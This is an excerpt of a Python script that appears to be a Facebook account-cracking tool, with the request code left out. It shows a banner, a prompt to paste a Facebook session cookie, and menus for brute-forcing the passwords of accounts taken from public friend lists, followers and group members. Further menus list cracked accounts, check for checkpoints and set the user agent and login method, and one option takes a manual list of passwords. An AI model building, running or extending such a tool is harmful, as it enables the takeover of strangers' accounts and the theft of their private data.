...
def banner():
	...
	jalan (
f"""
{M}  _________ _______  _______  _______  _______ 
{K}  \__   __/(  ___  )(       )(  ___  )(  ____ \
{H}       ) (   | (   ) || () () || (   ) || (    \/
{B}     | |   | |   | || || || || (___) || (_____ 
{U}     | |   | |   | || |(_)| ||  ___  |(_____  )
{M}     | |   | |   | || |   | || (   ) |      ) |
...
{H}     )_(   (_______)|/     \||/     \|\_______)   
  """)
	jalan (f' {U}════════════════════════════════════════')
	jalan (' %s#%s IP   %s:%s %s %s- %s%s'%(U,O,M,O,IP,H,O,CN))
	jalan (f' {U}# {O}Git  {M}: {O}{github}')
	jalan (f' {U}════════════════════════════════════════\n')
...
def Masuk():
	try:
		...
		os.system('clear')
		banner()
		jalan ('%s%s%s 01 %sLOGIN BY COOKIE (CRACK FAST FACEBOOK) '%(U,til,K,O))
		jalan ('%s%s%s 00 %sEXIT '%(U,til,M,O))
		while True:
			rom = input ("\n%s# %sSelect %s> %s"%(P,O,M,K))
			if rom in(""):
				print("%s%s ERROR "%(M,til))
			elif rom in ('1','01'):
				jalane("\n%s!%s PLEASE PASTE COOKIE FB"%(M,O))
...
def login_bot(romz):
	print ('Ketik ulang (python Dec.py)')
...
class Menu():
	...
	def tentang(self):
		...
		if "mbasic_logout_button" not in a:
			...
			banner()
			jalan ('%s•%s 01 %sCRACK BY PUBLIC FRIEND '%(U,P,O))
			jalan ('%s•%s 02 %sCRACK BY PUBLIC FRIEND  (PROl)'%(U,P,O))
			jalan ('%s•%s 03 %sCRACK BY FOLLOWERS'%(U,P,O))
			jalan ('%s•%s 04 %sCRACK FROM MEMBER GROUP'%(U,P,O))
			jalan ('%s•%s 05 %sVIEW LIST ACCOUNT CRACKED'%(U,P,O))
			jalan ('%s•%s 06 %sCHECKPOINT CHECKER'%(U,P,O))
			jalan ('%s•%s UA %sUSER-AGENT SETTING'%(U,M,O))
			jalan ('%s•%s RM %sREMOVE FB (COOKIE)'%(U,M,O))
			jalan ('%s•%s 00 %sExit'%(U,M,O))
...
class pilihan:
	...
	def menu(self):
		...
		if slut in['',' ']:
			...
			jalane ("\n%s%s %sPAST ID PUBLIC FRIEND "%(U,til,O))
			idt = input('%s%s %sPASTE/ID%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				jalane ('\n%s%s ERROR'%(M,til));jeda(2)
			...
			jalane ("\n%s%s %sPLEASE PAST ID "%(U,til,O))
			idt = input('%s%s %sPAST/ID%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				jalane ('\n%s%s ERROR'%(M,til));jeda(2)
			else:
			...
			jalane ("%s%s%s 00 %sKembali "%(U,til,M,O))
	...
	def MassalGRAPH(self, token):
		...
		try:
			print ('')
			jalane(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
		except:
			pass
				...
				if pwx == '':
					...
					def manual(brute=None):
						...
						if ind =='':
							...
							manual()
					print ('\n%s•%s [ %sChoose login methode %s ]\n'%(U,O,U,O))
					print ('%s• %s01%s Methode %sFree %s(Fast - Not recommended)'%(U,P,O,P,M))
					print ('%s• %s02%s Methode %sMbasic %s(Normal - Recommended) '%(U,P,O,P,H))
					print ('%s• %s03%s Methode %sMobile %s(Slow - Optional) '%(U,P,O,P,M))
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			print ('\n%s•%s [ %sChoose login methode%s ]\n'%(U,O,U,O))
